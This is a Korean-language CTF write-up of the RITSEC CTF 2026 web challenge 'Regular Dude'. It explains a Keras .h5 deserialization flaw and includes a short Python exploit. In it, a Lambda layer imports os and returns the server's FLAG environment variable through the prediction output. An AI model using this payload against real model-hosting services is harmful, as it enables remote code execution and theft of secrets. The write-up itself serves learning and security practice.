---
ctf_name: "RITSEC CTF 2026"
challenge_name: "regular dude"
category: "web"
difficulty: "easy"
author: "penguink-hub"
date: "2026-04-05"
points: 121
tags: [web, ai, machine-learning, keras, rce]
---

# Regular Dude

## 문제 설명

> Regular Dude라는 인물이 운영하는 모델 서버에 악성 모델을 업로드하여 시스템 내부의 플래그(FLAG 환경 변수)를 탈취해야 하는 문제.

- Target URL: https://regular-dude-manager.ctf.ritsec.club/ (Instance 기반 타겟 서버)

## 풀이

### 분석

웹 사이트는 사용자가 업로드한 Keras AI 모델 파일(.h5)을 백엔드 서버에서 로드하여 처리하는 기능을 가지고 있습니다. 사용자의 입력값을 서버가 검증 없이 역직렬화(Deserialization)하여 로드하는 구조이므로, 악성 페이로드가 포함된 모델 파일을 업로드하면 서버 측에서 코드를 실행할 수 있을 것으로 판단했습니다.

### 취약점

이 문제는 Keras 모델 파일의 역직렬화 과정에서 발생하는 임의 코드 실행(RCE) 취약점을 다룹니다. TensorFlow/Keras의 Lambda 레이어는 사용자가 정의한 임의의 파이썬 함수를 모델 내부에 포함할 수 있게 해줍니다. 

Keras가 모델을 저장할 때 일반 함수는 함수의 이름만 저장하는 반면, 파이썬의 익명 함수인 lambda는 함수 내부의 바이트코드를 통째로 직렬화하여 파일에 포함시킵니다. 따라서 서버가 이 파일을 로드하고 예측 연산을 수행하는 순간 직렬화되어 있던 악성 바이트코드가 함께 실행되면서 RCE가 발생하게 됩니다.

### 익스플로잇

목표는 환경 변수에 저장된 FLAG 값을 탈취하는 것입니다. 외부 서버로 몰래 빼내는 대신 Lambda 레이어 내부에서 os 모듈을 동적으로 불러와 FLAG 환경 변수를 읽고 이를 TensorFlow 상수(constant)로 반환하도록 모델을 구성합니다. 이렇게 하면 서버가 모델의 예측 결과를 화면에 보여줄 때 플래그 값이 그대로 노출됩니다.

1. 로컬 환경에서 Lambda 레이어에 FLAG 값을 반환하는 악성 익명 함수가 포함된 Keras 모델을 만듭니다.
2. 해당 모델을 exploit.h5 파일로 저장합니다.
3. 문제의 Target URL에 접속하여 생성된 exploit.h5 파일을 업로드합니다.
4. 서버가 모델을 로드하고 예측(Predict)을 수행하는 순간 화면에 플래그 값이 출력됩니다.

```python
import tensorflow as tf

# os 모듈을 동적으로 불러와서 FLAG 환경 변수를 가져오는 페이로드
model = tf.keras.Sequential([
    tf.keras.layers.InputLayer(input_shape=(1,)),
    tf.keras.layers.Lambda(
        lambda x: __import__('tensorflow').constant(
            __import__('os').environ.get('FLAG', 'FLAG_NOT_FOUND')
        )
    )
])

# 모델 저장
model.save('exploit.h5')

```

## 플래그

```
RS{REDACTED}
```
